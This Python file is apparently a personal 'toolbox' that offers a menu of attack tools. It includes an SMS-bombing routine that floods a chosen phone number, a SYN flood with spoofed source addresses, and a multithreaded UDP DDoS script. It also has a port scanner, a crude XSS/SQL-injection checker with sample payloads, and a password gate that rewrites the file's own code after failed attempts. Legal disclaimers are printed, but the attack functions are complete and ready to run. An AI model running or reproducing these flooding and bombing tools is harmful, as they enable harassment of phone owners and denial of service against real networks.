# Licensed to the Apache Software Foundation (ASF) under one
# or more contributor license agreements.  See the NOTICE file
# distributed with this work for additional information
# regarding copyright ownership.  The ASF licenses this file
# to you under the Apache License, Version 2.0 (the
# "License"); you may not use this file except in compliance
# with the License.  You may obtain a copy of the License at
#
#   http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing,
# software distributed under the License is distributed on an
# "AS IS" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
# KIND, either express or implied.  See the License for the
# specific language governing permissions and limitations
# under the License.


import hashlib
import sys
import os
import time
import socket
import random
from datetime import datetime
import requests
import re
import psutil
from scapy.all import send
import subprocess
import dns.resolver

# 最大密码尝试次数
MAX_ATTEMPTS = 3


# 显示版权信息
def show_legal_notice():
    print("Bohan_Hou的工具箱")
    print("作者：Bohan_Hou")
    print("许可证：Apache License 2.0")
    print("版权所有：Bohan_Hou")
    print("项目地址: https://github.com/YT-Houbohan/Bohan_Hou_Tools")
    print("联系方式：  QQ:3225215070"
          "\n            Email: hou.bohan@qq.com"
          "\n            Github: https://github.com/YT-Houbohan")
    print("\033[31m\n警告：此工具仅供授权的安全测试和学习使用。\033[0m\n \033[31m作者不承担因使用此工具造成的一切后果。\033[0m")
    print("\033[31m\n警告：未经授权使用此工具对目标系统进行攻击可能违反法律。\033[0m\n")
    print("\033[31m\n警告：使用此工具造成的任何法律纠纷，由使用者自行承担。\033[0m\n \033[31m作者不承担因使用此工具造成的一切法律责任。\033[0m")
    print("使用本工具即表示您同意遵守相关法律法规。")
    input("按Enter键继续...")


# 对密码进行哈希加密
def hash_password(password):
    hash_object = hashlib.sha256(password.encode())
    return hash_object.hexdigest()


# 禁用程序自身
def disable_self():
    with open(__file__, 'r', encoding='utf-8') as f:
        lines = f.readlines()

    disabled_code = [
        "# DISABLED BY SECURITY SYSTEM\n",
        "print('程序已被禁用，\033[31m\n请勿使用此程序！\033[0m')\n",
        "import sys; sys.exit(1)\n"
    ]

    with open(__file__, 'w', encoding='utf-8') as f:
        f.writelines(disabled_code + lines)


# 验证密码
show_legal_notice()


def verify_password():
    hashed_password = hash_password("Bohan_Hou")
    attempts = 0
    while attempts < MAX_ATTEMPTS:
        pw = input("请输入密码: ")
        input_hashed = hash_password(pw)
        if input_hashed == hashed_password:
            return True
        else:
            print("\033[31m\n密码不对,请重新输入(最多3次)\033[0m")
            attempts += 1
    if attempts >= MAX_ATTEMPTS:
        disable_self()
        print("\033[31m程序已被禁用！\033[31m\n请勿使用此程序！\033[0m")
        sys.exit(1)


# 显示进度条
def show_progress(percentage):
    bar_length = 20
    filled_length = int(bar_length * percentage / 100)
    bar = '=' * filled_length + ' ' * (bar_length - filled_length)
    print(f"[{bar}] {percentage}%")


import threading
from queue import Queue


# 手机号短信轰炸
def Mobile_phone_number_SMS_bombing():
    # 代码内嵌短信平台信息
    url = "https://sms.tencentcloudapi.com"  # 短信平台接口地址
    uid = "your_account_name"  # 账户名
    key = "your_account_password"  # 账户密码

    # 获取用户输入的手机号
    while True:
        phone_number = input("请输入要轰炸的手机号: ")
        if re.match(r'^1[3-9]\d{9}$', phone_number):
            break
        else:
            print("输入的手机号格式不正确，请重新输入。")

    # 获取用户输入的发送次数
    while True:
        try:
            send_count = int(input("请输入要发送的短信次数: "))
            if send_count > 0:
                break
            else:
                print("发送次数必须大于0，请重新输入。")
        except ValueError:
            print("输入无效，请输入一个整数。")

    # 获取用户输入的发送间隔时间（秒）
    while True:
        try:
            interval = float(input("请输入每次发送短信的间隔时间（秒）: "))
            if interval > 0:
                break
            else:
                print("间隔时间必须大于0，请重新输入。")
        except ValueError:
            print("输入无效，请输入一个有效的数字。")

    # 获取用户输入的自定义参数
    custom_params = input("请输入自定义请求参数，格式为 key1=value1&key2=value2: ")
    param_dict = dict(pair.split('=') for pair in custom_params.split('&')) if custom_params else {}

    # 设置发送短信的信息内容
    sms_text = input("请输入要发送的短信内容: ")

    # 合并通用参数和自定义参数
    data = {'Uid': uid, 'Key': key, 'smsMob': phone_number, 'smsText': sms_text}
    data.update(param_dict)

    # 添加请求头
    headers = {
        'Content-Type': 'application/x-www-form-urlencoded',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    }

    # 循环发送短信
    for i in range(send_count):
        try:
            # 发送POST请求
            res = requests.post(url, data=data, headers=headers, timeout=10)

            # 检查HTTP状态码
            res.raise_for_status()

            # 解析返回结果中的短信发送状态
            match = re.search('<message>(.*?)</message>', res.text)
            if match:
                status = match.group(1)
                print(f'第{i + 1}次发送短信状态：{status}')
            else:
                print(f'第{i + 1}次发送失败：无法解析响应内容')
                print(f'响应内容：{res.text}')

        except requests.exceptions.RequestException as e:
            print(f'第{i + 1}次发送请求异常：{e}')
        # 添加间隔时间避免触发限流
        time.sleep(interval)


# SYN洪水攻击
def syn_flood():
    import random
    from scapy.layers.inet import IP, TCP
    from scapy.all import send

    # 生成随机的IP
    def randomIP():
        ip = ".".join(map(str, (random.randint(0, 255) for i in range(4))))
        return ip

    # 生成随机端口
    def randomPort():
        port = random.randint(1000, 10000)
        return port

    # syn-flood
    def synFlood(count, dstIP):
        total = 0
        print("Packets are sending ...")
        for i in range(count):
            # IPlayer
            srcIP = randomIP()  # 随机源ip地址
            dstIP = dstIP
            IPlayer = IP(src=srcIP, dst=dstIP)
            # TCPlayer
            srcPort = randomPort()
            TCPlayer = TCP(sport=srcPort, dport=randomPort(), flags="S")
            # 发送包
            packet = IPlayer / TCPlayer
            send(packet)
            total += 1
        print("Total packets sent: %i" % total)

    # 显示的信息
    def info():
        print("#" * 30)
        print("# Welcome to SYN Flood Tool  #")
        print("#" * 30)
        # 输入目标IP和端口
        dstIP = input("Target IP : ")
        return dstIP

    dstIP = info()
    count = int(input("Please input the number of packets："))
    synFlood(count, dstIP)


# 端口扫描器
import socket


def validate_ip(target):
    try:
        socket.inet_aton(target)
        return True
    except socket.error:
        return False


def validate_ports(ports_input):
    try:
        ports = [int(port) for port in ports_input.split(',')]
        return ports
    except ValueError:
        return None


def port_scanner():
    while True:
        target = input("请输入目标 IP 地址: ")
        if validate_ip(target):
            break
        else:
            print("输入的 IP 地址格式无效，请重新输入。")

    while True:
        ports_input = input("请输入要扫描的端口，用逗号分隔 (例如: 80,443): ")
        ports = validate_ports(ports_input)
        if ports is not None:
            break
        else:
            print("输入的端口号无效，请输入有效的整数，用逗号分隔。")

    port_scan(target, ports)


def port_scan(target, ports):
    print(f"开始扫描 {target}...")
    for port in ports:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            result = sock.connect_ex((target, port))
            if result == 0:
                print(f"端口 {port} 开放")
            else:
                print(f"端口 {port} 关闭")
            sock.close()
        except socket.gaierror:
            print(f"无法解析主机名 {target}，请检查输入的 IP 地址。")
            break
        except socket.timeout:
            print(f"扫描端口 {port} 时超时，请检查网络连接或目标主机状态。")
        except socket.error as e:
            print(f"扫描端口 {port} 时出现网络错误: {e}")
        except Exception as e:
            print(f"扫描端口 {port} 时出现未知错误: {e}")


# DDoS脚本
def ddos_attack():
    now = datetime.now()
    hour = now.hour
    minute = now.minute
    day = now.day
    month = now.month
    year = now.year

    os.system("clear")
    os.system("figlet Elsa-zlt DDos Attack")
    print()
    print("Author   : Bohan_Hou")
    print("未经授权对目标进行 DDoS 攻击是违法且不道德的行为，可能会导致严重的法律后果。此代码仅用于学习和研究网络编程及安全防御相关知识，请勿用于非法活动。")
    print()

    ip = input("IP Target : ")

    while True:
        port = input("Port       : ")
        try:
            port = int(port)
            break
        except ValueError:
            print("输入的端口号无效，请输入一个整数。")

    while True:
        speed = input("攻击速度 (数据包/秒, 建议<1000): ")
        try:
            packets_per_second = int(speed)
            if packets_per_second <= 0:
                print("速度必须大于0")
            else:
                break
        except ValueError:
            print("输入无效，请输入一个整数。")

    os.system("clear")
    os.system("figlet Elsa-zlt DDos Attack")
    print(f"目标: {ip}:{port}")
    print(f"攻击速度: {packets_per_second} 数据包/秒")
    print("准备中...")

    for i in range(0, 101, 25):
        show_progress(i)
        time.sleep(0.5)  # 加速准备进度显示

    # 计算每个线程的发送间隔 (毫秒)
    thread_count = 10
    interval = 1.0 / packets_per_second * thread_count

    packet_queue = Queue()
    # 预生成大量数据包
    for _ in range(10000):
        packet_queue.put(random._urandom(1490))

    def attack_worker():
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sent_count = 0
        start_time = time.time()

        while not packet_queue.empty():
            try:
                packet = packet_queue.get()
                sock.sendto(packet, (ip, port))
                sent_count += 1

                # 速度控制
                elapsed = time.time() - start_time
                expected_elapsed = sent_count * interval
                if elapsed < expected_elapsed:
                    time.sleep(expected_elapsed - elapsed)

                # 每100个包显示一次进度
                if sent_count % 100 == 0:
                    current_speed = sent_count / (time.time() - start_time)
                    print(f"\r已发送: {sent_count} 数据包 | 当前速度: {current_speed:.1f} PPS", end="")

            except Exception as e:
                print(f"\n线程出错: {e}")
            finally:
                packet_queue.task_done()

    # 创建并启动多个攻击线程
    print("\n启动攻击线程...")
    threads = []
    for i in range(thread_count):
        t = threading.Thread(target=attack_worker)
        t.daemon = True
        t.start()
        threads.append(t)
        print(f"线程 {i + 1}/{thread_count} 已启动")
        time.sleep(0.1)  # 线程启动间隔，避免系统过载

    # 等待所有线程完成
    print("\n攻击进行中，按 Ctrl+C 停止...")
    try:
        for t in threads:
            t.join()
    except KeyboardInterrupt:
        print("\n用户中断，正在停止攻击...")

    print("\n攻击已停止")


# 简单的 XSS 检测
def check_xss(url):
    xss_payload = '<script>alert("XSS")</script>'
    xss_url = f"{url}?param={xss_payload}"
    try:
        response = requests.get(xss_url)
        if xss_payload in response.text:
            print(f"[!] 可能存在 XSS 漏洞: {xss_url}")
        else:
            print("[✓] 未检测到 XSS 漏洞")
    except Exception as e:
        print(f"XSS 检测出错: {e}")


# 简单的 SQLi 检测
def check_sqli(url):
    sqli_payloads = ["' OR '1'='1", "' OR 1=1 --"]
    for payload in sqli_payloads:
        sqli_url = f"{url}?id={payload}"
        try:
            response = requests.get(sqli_url)
            if response.status_code == 200:
                print(f"[!] 可能存在 SQL 注入漏洞: {sqli_url}")
            else:
                print(f"[✓] {payload} 测试未发现 SQL 注入")
        except Exception as e:
            print(f"SQLi 检测出错: {e}")


# Web漏洞扫描器
def web_vulnerability_scanner():
    url = input("请输入要扫描的 URL: ")
    check_xss(url)
    check_sqli(url)


# 获取本机所有网络接口信息
def get_local_network_info():
    interfaces = psutil.net_if_addrs()
    for interface, addrs in interfaces.items():
        print(f"接口名称: {interface}")
        for addr in addrs:
            if addr.family == socket.AF_INET:
                print(f"  IPv4 地址: {addr.address}")
                print(f"  子网掩码: {addr.netmask}")
            elif addr.family == socket.AF_INET6:
                print(f"  IPv6 地址: {addr.address}")
            elif addr.family == psutil.AF_LINK:
                print(f"  MAC 地址: {addr.address}")
        print()


# Ping 测试
def ping_test():
    target = input("请输入要 Ping 的目标 IP 或域名: ")
    try:
        result = subprocess.run(['ping', '-c', '4', target], capture_output=True, text=True)
        print(result.stdout)
    except Exception as e:
        print(f"Ping 测试出错: {e}")


# Traceroute 功能
def traceroute():
    target = input("请输入要 Traceroute 的目标 IP 或域名: ")
    try:
        result = subprocess.run(['traceroute', target], capture_output=True, text=True)
        print(result.stdout)
    except Exception as e:
        print(f"Traceroute 出错: {e}")


# DNS 查询
def dns_lookup():
    domain = input("请输入要查询的域名: ")
    try:
        answers = dns.resolver.query(domain, 'A')
        for rdata in answers:
            print(f"{domain} 的 IP 地址是: {rdata.address}")
    except dns.resolver.NXDOMAIN:
        print(f"未找到 {domain} 的 DNS 记录。")
    except Exception as e:
        print(f"DNS 查询出错: {e}")


# 显示菜单
def show_menu():
    menu_options = {
        "000": ("退出", sys.exit),
        "1": ("DDoS攻击脚本", ddos_attack),
        "2": ("简单的 Web 漏洞扫描器", web_vulnerability_scanner),
        "3": ("端口扫描器", port_scanner),
        "4": ("手机号轰炸", Mobile_phone_number_SMS_bombing),
        "5": ("获取本机网络接口信息", get_local_network_info),
        "6": ("SYN洪水攻击脚本", syn_flood),
        "7": ("Ping 测试", ping_test),
        "8": ("Traceroute 功能", traceroute),
        "9": ("DNS 查询", dns_lookup)
    }
    print("--------------------------")
    print("欢迎使用BohanHou的工具箱,请选择:")
    for key, (option, _) in menu_options.items():
        print(f"{key}.{option}")
    while True:
        choice = input("请输入: ")
        if choice in menu_options:
            print(f"正在调用{menu_options[choice][0]}...")
            menu_options[choice][1]()
            break
        else:
            print("无效的选择，请重新输入。")


# 主程序
print("欢迎使用BohanHou的工具箱,请输入密码:")
if verify_password():
    show_menu()


# 主程序
print("欢迎使用BohanHou的工具箱,请输入密码:")
if verify_password():
    show_menu()
